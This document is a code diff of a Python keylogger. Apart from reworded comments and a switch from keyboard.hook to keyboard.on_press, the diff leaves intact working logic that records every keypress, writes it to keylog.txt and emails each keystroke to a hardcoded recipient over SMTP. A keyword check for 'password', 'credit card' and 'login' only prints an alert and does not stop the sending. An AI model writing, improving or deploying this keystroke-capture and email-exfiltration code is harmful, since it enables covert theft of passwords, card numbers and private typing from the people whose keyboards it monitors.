@@ -6,14 +6,14 @@ from datetime import datetime
 
 def send_email(subject, body):
     """
-    Sends an email with the keystroke log.
+    Sends an email with the key log.
     """
     try:
         sender_email = 'youremail@gmail.com'  # Your email address
         receiver_email = 'recipient@gmail.com'  # Recipient's email address
-        password = 'yourpassword'  # Your email account password
+        password = 'yourpassword'  # Your email password
 
-        # Set up the message
+        # Configure the message
         message = MIMEMultipart()
         message['From'] = sender_email
         message['To'] = receiver_email
@@ -31,7 +31,7 @@ def send_email(subject, body):
 
 def detect_suspicious_activity(key_info):
     """
-    Detects suspicious activity in the keystroke log.
+    Detects suspicious activity in the key log.
     """
     suspicious_patterns = ['password', 'username', 'credit card', 'login']
 
@@ -44,30 +44,30 @@ def detect_suspicious_activity(key_info):
 def keylogger_callback(event):
     """
     Callback function for the keylogger.
-    Records the pressed key, sends the log via email, and saves it to a text file.
-    It also detects suspicious activity and sends an alert if necessary.
+    Logs the pressed key, sends the log by email, and saves it to a text file.
+    Also detects suspicious activity and sends an alert if necessary.
     """
     try:
         key_name = event.name
         scan_code = event.scan_code
         time_stamp = event.time
 
-        # Build a string with the key information
+        # Construct a string with key information
         key_info = f"Key: {key_name}, Scan Code: {scan_code}, Time: {time_stamp}\n"
 
-        # Print the information to the console
+        # Print information to the console
         print(key_info, end="")
 
         # Detect suspicious activity
         if detect_suspicious_activity(key_info):
             print("Alert! Suspicious activity detected.")
 
-        # Send the log via email
-        subject = 'Keystroke Log'
+        # Send the log by email
+        subject = 'Key Log'
         body = key_info
         send_email(subject, body)
 
-        # Save the information to a text file
+        # Save information to a text file
         with open("keylog.txt", "a", encoding="utf-8") as file:
             file.write(key_info)
             
@@ -77,14 +77,14 @@ def keylogger_callback(event):
 def main():
     print("Starting Keylogger. Press any key to begin logging...")
 
-    # Set up the keylogger hook
-    keyboard.hook(keylogger_callback)
+    # Install the keylogger hook
+    keyboard.on_press(keylogger_callback)
 
     try:
         # Wait indefinitely until a key is pressed to terminate the program
         keyboard.wait()
     except KeyboardInterrupt:
-        # Handle keyboard interruption (Ctrl+C) to gracefully exit
+        # Handle keyboard interrupt (Ctrl+C) to exit gracefully
         print("\nKeylogger stopped. Exiting...")
 
 if __name__ == "__main__":
